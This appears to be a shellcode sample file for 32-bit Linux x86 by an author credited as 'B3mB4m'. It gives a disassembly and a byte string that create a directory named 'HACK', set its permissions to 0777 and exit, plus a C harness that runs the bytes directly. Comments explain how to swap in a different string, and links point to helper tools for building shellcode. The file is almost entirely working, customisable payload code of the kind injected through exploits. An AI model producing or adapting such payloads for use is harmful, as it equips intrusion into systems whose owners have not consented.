/*
#Greetz : Bomberman(Leader)
#Author : B3mB4m


#Auxiliary tools (50% time gain !)
#https://github.com/b3mb4m/Shellcode/blob/master/Auxiliary/convertstack.py
#https://github.com/b3mb4m/Shellcode/blob/master/Auxiliary/ASMtoShellcode.py


Disassembly of section .text:

08048060 <.text>:
 8048060:	31 c0                	xor    %eax,%eax
 8048062:	50                   	push   %eax
 8048063:	68 48 41 43 4b       	push   $0x4b434148  #You can change it !
 8048068:	b0 27                	mov    $0x27,%al
 804806a:	89 e3                	mov    %esp,%ebx
 804806c:	66 41                	inc    %cx
 804806e:	cd 80                	int    $0x80
 8048070:	b0 0f                	mov    $0xf,%al
 8048072:	66 b9 ff 01          	mov    $0x1ff,%cx
 8048076:	cd 80                	int    $0x80
 8048078:	31 c0                	xor    %eax,%eax
 804807a:	40                   	inc    %eax
 804807b:	cd 80                	int    $0x80
*/

#include <stdio.h>
#include <string.h>

char *shellcode =
"\x31\xc0\x50\x68\x48\x41\x43\x4b\xb0\x27\x89\xe3\x66\x41\xcd\x80\xb0\x0f\x66\xb9\xff\x01\xcd\x80\x31\xc0\x40\xcd\x80";


//First push always start with byte 68.Also mov b0.
//Than just push your string between byte 68 - b0 ! :)
//Here it is -> \x68   "\x48\x41\x43\x4b\"    xb0     GOODLUCK !


int main(void){
	fprintf(stdout,"Length: %d\n",strlen(shellcode));
	(*(void(*)()) shellcode)();}